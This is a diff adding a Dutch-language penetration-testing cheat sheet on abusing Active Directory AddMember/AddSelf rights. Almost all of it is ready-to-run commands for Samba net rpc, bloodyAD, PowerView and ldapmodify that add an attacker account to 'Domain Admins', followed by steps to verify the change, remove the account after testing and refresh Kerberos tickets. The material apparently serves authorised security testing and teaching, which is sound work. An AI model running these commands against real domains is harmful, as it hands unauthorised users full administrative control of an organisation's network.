@@ -1,0 +1,30 @@
+# AddMember / AddSelf — Groepslidmaatschap wijzigen
+# Voeg jezelf of anderen toe aan beveiligingsgroepen
+#
+# === Vereisten ===
+# - WriteProperty op het member-attribuut van de groep (AddMember)
+# - Of Self recht op de groep (AddSelf — alleen jezelf toevoegen)
+#
+# === Voorbeelden ===
+
+# Via net rpc (Samba)
+net rpc group addmem "Domain Admins" ATTACKER_USER -U DOMAIN/USER%'PASS' -S DC_IP
+
+# Via bloodyAD
+python3 bloodyAD.py -u USER -p 'PASS' -d DOMAIN --host DC_IP add groupMember "Domain Admins" ATTACKER_USER
+
+# Via PowerView
+powershell -c "Import-Module .\PowerView.ps1; Add-DomainGroupMember -Identity 'Domain Admins' -Members ATTACKER_USER -Verbose"
+
+# Via ldapmodify
+python3 ldapmodify -u USER -p 'PASS' -d DOMAIN -dc DC_IP "CN=Domain Admins,CN=Users,DC=domain,DC=local" member "CN=attacker,CN=Users,DC=domain,DC=local"
+
+# Verifieer lidmaatschap
+net rpc group members "Domain Admins" -U DOMAIN/USER%'PASS' -S DC_IP
+
+# Verwijder na test
+net rpc group delmem "Domain Admins" ATTACKER_USER -U DOMAIN/USER%'PASS' -S DC_IP
+
+# Noot: BloodHound edges: AddMember, AddSelf, GenericWrite op groep
+# Noot: Nieuwe groepslidmaatschappen vereisen nieuw Kerberos ticket
+# Noot: klist purge && kinit om nieuw ticket met bijgewerkte groepen te krijgen
